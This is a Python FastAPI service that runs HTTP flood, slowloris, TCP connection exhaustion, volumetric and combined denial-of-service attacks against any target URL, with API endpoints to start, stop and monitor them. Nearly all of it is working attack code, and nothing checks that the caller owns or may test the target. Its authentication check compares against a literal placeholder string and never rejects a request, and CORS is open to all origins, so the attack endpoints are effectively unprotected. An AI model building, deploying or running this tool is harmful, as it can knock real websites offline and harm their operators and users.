import os
import time
import logging
import multiprocessing
import socket
import random
import requests
import threading
from fastapi import FastAPI, HTTPException, Depends
from pydantic import BaseModel, validator
from typing import Dict, Any
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from datetime import datetime
import statistics

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Security (authentication left as original)
security = HTTPBearer()

# FastAPI app
app = FastAPI()

# Allow CORS for frontends (e.g., Next.js)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Create a Manager for shared state among processes
manager = multiprocessing.Manager()
attack_processes = {}  # Maintains process objects per attack
attack_stats = manager.dict()    # Shared dictionary for stats
attack_logs = manager.dict()     # Shared dictionary for logs

# Models
class AttackConfig(BaseModel):
    target_url: str
    duration: int  # in seconds
    intensity: int  # 1-5 scale
    concurrent_connections: int
    attack_type: str  # http_flood, slowloris, tcp_exhaustion, volumetric, mixed

    @validator('intensity')
    def intensity_range(cls, v):
        if not 1 <= v <= 5:
            raise ValueError('intensity must be between 1 and 5')
        return v

    @validator('duration')
    def duration_positive(cls, v):
        if v <= 0:
            raise ValueError('duration must be positive')
        return v

# A helper model for attack stats (converted to dict for shared usage)
class AttackStats(BaseModel):
    requests_sent: int = 0
    connections_open: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: datetime = None
    complete: bool = False
    # Enhanced Metrics placeholders:
    latency_samples: list = []
    http_status_codes: dict = {}
    timeout_count: int = 0
    bandwidth: dict = {}  # keys: total_data_transferred, peak_download, download_history
    connection_metrics: dict = {}  # keys: attempts, successes, active_connections, lifetimes
    request_performance: dict = {}  # keys: requests_per_second, success_failure_ratio

    def to_dict(self) -> Dict[str, Any]:
        latencies = self.latency_samples if self.latency_samples else []
        min_latency = min(latencies) if latencies else None
        max_latency = max(latencies) if latencies else None
        avg_latency = statistics.mean(latencies) if latencies else None
        median_latency = statistics.median(latencies) if latencies else None
        return {
            "requests_sent": self.requests_sent,
            "connections_open": self.connections_open,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "complete": self.complete,
            "latency_samples": latencies,
            "min_latency": min_latency,
            "max_latency": max_latency,
            "avg_latency": avg_latency,
            "median_latency": median_latency,
            "http_status_codes": self.http_status_codes,
            "timeout_count": self.timeout_count,
            "bandwidth": self.bandwidth,
            "connection_metrics": self.connection_metrics,
            "request_performance": self.request_performance
        }

# Helper function to extract host and port from URL
def extract_host(target_url: str, default_port: int = 80) -> (str, int):
    try:
        url_without_scheme = target_url.split("://")[-1]
        host = url_without_scheme.split("/")[0]
        return host, default_port
    except Exception as e:
        logger.error(f"Error extracting host: {e}")
        raise

# Authentication dependency (kept as is)
def authenticate(credentials: HTTPAuthorizationCredentials = Depends(security)) -> bool:
    token = "os.getenv(API_SECRET_KEY)"
    if credentials.credentials == token:
        return True
    return False

# Health check endpoint
@app.get("/health")
async def health_check():
    return {"status": "ok", "message": "Service is running"}

# ------------------ Enhanced Metrics & Error Handling ------------------- #

def update_request_performance(shared_stats: Dict, elapsed_time: float):
    try:
        requests_sent = shared_stats.get("requests_sent", 0)
        errors = shared_stats.get("errors", 0)
        if elapsed_time > 0:
            rps = requests_sent / elapsed_time
        else:
            rps = 0
        shared_stats.setdefault("request_performance", {})["requests_per_second"] = rps
        if requests_sent > 0:
            shared_stats["request_performance"]["success_failure_ratio"] = (requests_sent - errors) / requests_sent
        else:
            shared_stats["request_performance"]["success_failure_ratio"] = None
    except Exception as e:
        logger.error(f"Error updating request performance: {e}")

# ------------------ Attack Implementations with Enhanced Metrics ------------------- #

# Sophisticated HTTP Flood Attack
def http_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    shared_stats["requests_sent"] = 0
    shared_stats["errors"] = 0
    shared_stats.setdefault("latency_samples", [])
    shared_stats.setdefault("http_status_codes", {})
    shared_stats.setdefault("timeout_count", 0)
    shared_stats.setdefault("bandwidth", {"total_data_transferred": 0, "peak_download": 0, "download_history": []})

    user_agents = [
        "DDoS-Test", "Mozilla/5.0", "SaaS-Security-Tool", "Indie-Hacker-Agent"
    ]
    sleep_factor = max(0.05, 1 / intensity)
    while time.time() - start_time < duration:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            req_start = time.perf_counter()
            response = requests.get(target_url, headers=headers, timeout=5)
            req_end = time.perf_counter()
            latency = (req_end - req_start) * 1000  # ms
            # Update latency metrics (keeping last 10 samples)
            latencies = shared_stats["latency_samples"]
            latencies.append(latency)
            if len(latencies) > 10:
                latencies.pop(0)
            shared_stats["requests_sent"] += 1
            # Update HTTP status code counts
            code = response.status_code
            http_codes = shared_stats["http_status_codes"]
            http_codes[code] = http_codes.get(code, 0) + 1
            # Update download bandwidth metrics
            downloaded = len(response.content)
            bw = shared_stats["bandwidth"]
            bw["total_data_transferred"] += downloaded
            bw["download_history"].append((time.time(), downloaded))
            if downloaded > bw["peak_download"]:
                bw["peak_download"] = downloaded
            if shared_stats["requests_sent"] % 100 == 0:
                shared_logs.setdefault("http_flood", []).append(
                    f"{datetime.now().isoformat()}: Sent {shared_stats['requests_sent']} requests."
                )
            time.sleep(sleep_factor)
        except requests.exceptions.Timeout as te:
            shared_stats["timeout_count"] += 1
            shared_stats["errors"] += 1
            shared_logs.setdefault("http_flood", []).append(
                f"{datetime.now().isoformat()}: Timeout error: {te}"
            )
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("http_flood", []).append(
                f"{datetime.now().isoformat()}: HTTP Flood Error: {e}"
            )
    elapsed = time.time() - start_time
    update_request_performance(shared_stats, elapsed)
    return

# Sophisticated Slowloris Attack
def slowloris(target_url: str, duration: int, intensity: int, concurrent_connections: int,
              shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    sockets = []
    shared_stats["connections_open"] = 0
    shared_stats["errors"] = 0
    shared_stats.setdefault("connection_metrics", {"attempts": 0, "successes": 0, "active_connections": 0, "lifetimes": []})
    host, port = extract_host(target_url)
    conn_metrics = shared_stats["connection_metrics"]
    connection_start_times = []  # Record each connection's open time

    for _ in range(concurrent_connections):
        try:
            conn_metrics["attempts"] += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Slowloris\r\n\r\n".encode())
            sockets.append(s)
            conn_metrics["successes"] += 1
            conn_metrics["active_connections"] += 1
            connection_start_times.append(time.time())
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Slowloris socket init error: {e}"
            )
    sleep_interval = max(0.5, 2 / intensity)
    while time.time() - start_time < duration:
        try:
            for s in sockets:
                try:
                    s.send("X-a: b\r\n".encode())
                except Exception as err:
                    shared_stats["errors"] += 1
                    shared_logs.setdefault("slowloris", []).append(
                        f"{datetime.now().isoformat()}: Slowloris keep-alive error: {err}"
                    )
            time.sleep(sleep_interval)
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Slowloris loop error: {e}"
            )
    # Proper cleanup: Close sockets and record connection lifetimes
    for idx, s in enumerate(sockets):
        try:
            s.close()
            if idx < len(connection_start_times):
                lifetime = time.time() - connection_start_times[idx]
                conn_metrics["lifetimes"].append(lifetime)
            conn_metrics["active_connections"] -= 1
        except Exception as e:
            shared_logs.setdefault("slowloris", []).append(
                f"{datetime.now().isoformat()}: Error closing socket: {e}"
            )
    return

# Sophisticated TCP Exhaustion Attack
def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                   shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    sockets = []
    shared_stats["connections_open"] = 0
    shared_stats["errors"] = 0
    shared_stats.setdefault("connection_metrics", {"attempts": 0, "successes": 0, "active_connections": 0, "lifetimes": []})
    conn_metrics = shared_stats["connection_metrics"]
    connection_start_times = []
    host, port = extract_host(target_url)
    for _ in range(concurrent_connections):
        try:
            conn_metrics["attempts"] += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sockets.append(s)
            conn_metrics["successes"] += 1
            conn_metrics["active_connections"] += 1
            connection_start_times.append(time.time())
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("tcp_exhaustion", []).append(
                f"{datetime.now().isoformat()}: TCP Exhaustion init error: {e}"
            )
    while time.time() - start_time < duration:
        time.sleep(1)
    for idx, s in enumerate(sockets):
        try:
            s.close()
            if idx < len(connection_start_times):
                lifetime = time.time() - connection_start_times[idx]
                conn_metrics["lifetimes"].append(lifetime)
            conn_metrics["active_connections"] -= 1
        except Exception as e:
            shared_logs.setdefault("tcp_exhaustion", []).append(
                f"{datetime.now().isoformat()}: Error closing TCP socket: {e}"
            )
    return

# Sophisticated Volumetric Attack
def volumetric(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: Dict, shared_logs: Dict):
    start_time = time.time()
    shared_stats["bytes_sent"] = 0
    shared_stats["errors"] = 0
    host, port = extract_host(target_url)
    payload_size = 1024 * 1024 * intensity
    payload = b"0" * payload_size
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sent = s.send(payload)
            shared_stats["bytes_sent"] += sent
            s.close()
        except Exception as e:
            shared_stats["errors"] += 1
            shared_logs.setdefault("volumetric", []).append(
                f"{datetime.now().isoformat()}: Volumetric error: {e}"
            )
    return

# Sophisticated Mixed Attack: run sub-attacks concurrently
def mixed(target_url: str, duration: int, intensity: int, concurrent_connections: int,
          shared_stats: Dict, shared_logs: Dict):
    sub_stats = manager.dict({
        "http_flood": manager.dict({"requests_sent": 0, "errors": 0, "latency_samples": [], "http_status_codes": {}}),
        "slowloris": manager.dict({"connections_open": 0, "errors": 0}),
        "tcp_exhaustion": manager.dict({"connections_open": 0, "errors": 0}),
        "volumetric": manager.dict({"bytes_sent": 0, "errors": 0})
    })
    threads = []
    t1 = threading.Thread(target=http_flood, args=(target_url, duration, intensity, concurrent_connections, sub_stats["http_flood"], shared_logs.setdefault("http_flood", [])))
    t2 = threading.Thread(target=slowloris, args=(target_url, duration, intensity, concurrent_connections, sub_stats["slowloris"], shared_logs.setdefault("slowloris", [])))
    t3 = threading.Thread(target=tcp_exhaustion, args=(target_url, duration, intensity, concurrent_connections, sub_stats["tcp_exhaustion"], shared_logs.setdefault("tcp_exhaustion", [])))
    t4 = threading.Thread(target=volumetric, args=(target_url, duration, intensity, concurrent_connections, sub_stats["volumetric"], shared_logs.setdefault("volumetric", [])))
    
    threads.extend([t1, t2, t3, t4])
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    combined = {
        "http_flood": dict(sub_stats["http_flood"]),
        "slowloris": dict(sub_stats["slowloris"]),
        "tcp_exhaustion": dict(sub_stats["tcp_exhaustion"]),
        "volumetric": dict(sub_stats["volumetric"])
    }
    shared_stats.update(combined)
    return

# Attack dispatcher: accepts shared stats and logs, updates complete state
def execute_attack(config: AttackConfig, shared_stats: Dict, shared_logs: Dict):
    shared_stats["start_time"] = datetime.now().isoformat()
    attack_func = {
        "http_flood": http_flood,
        "slowloris": slowloris,
        "tcp_exhaustion": tcp_exhaustion,
        "volumetric": volumetric,
        "mixed": mixed,
    }.get(config.attack_type, http_flood)
    try:
        attack_func(config.target_url, config.duration, config.intensity, config.concurrent_connections, shared_stats, shared_logs)
    except Exception as e:
        shared_logs.setdefault("general", []).append(
            f"{datetime.now().isoformat()}: General execution error: {e}"
        )
    shared_stats["complete"] = True

# ------------------ API Endpoints ------------------- #

@app.post("/api/attack/start", dependencies=[Depends(authenticate)])
async def start_attack(config: AttackConfig):
    attack_id = str(len(attack_processes) + 1)
    stats_obj = AttackStats(start_time=datetime.now(), complete=False)
    attack_stats[attack_id] = manager.dict(stats_obj.to_dict())
    attack_logs[attack_id] = manager.list()
    
    # Launch attack process with proper cleanup measures
    process = multiprocessing.Process(target=execute_attack, args=(config, attack_stats[attack_id], attack_logs[attack_id]))
    process.start()
    attack_processes[attack_id] = process
    logger.info(f"Started attack {attack_id} with config {config}")
    return {"attack_id": attack_id}

@app.get("/api/attack/{attack_id}/stop", dependencies=[Depends(authenticate)])
async def stop_attack(attack_id: str):
    if attack_id in attack_processes:
        try:
            process = attack_processes[attack_id]
            process.terminate()
            process.join(timeout=5)  # Ensure process termination and cleanup
        except Exception as e:
            logger.error(f"Error during termination of attack {attack_id}: {e}")
        finally:
            if attack_id in attack_processes:
                del attack_processes[attack_id]
            if attack_id in attack_stats:
                stats = attack_stats[attack_id]
                stats["complete"] = True
        logger.info(f"Stopped attack {attack_id}")
        return {"status": "stopped"}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/logs", dependencies=[Depends(authenticate)])
async def get_logs(attack_id: str):
    if attack_id in attack_logs:
        return {"logs": list(attack_logs[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats", dependencies=[Depends(authenticate)])
async def get_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": dict(attack_stats[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

@app.get("/api/attack/{attack_id}/stats/realtime", dependencies=[Depends(authenticate)])
async def get_realtime_stats(attack_id: str):
    if attack_id in attack_stats:
        return {"stats": dict(attack_stats[attack_id])}
    else:
        raise HTTPException(status_code=404, detail="Attack not found")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
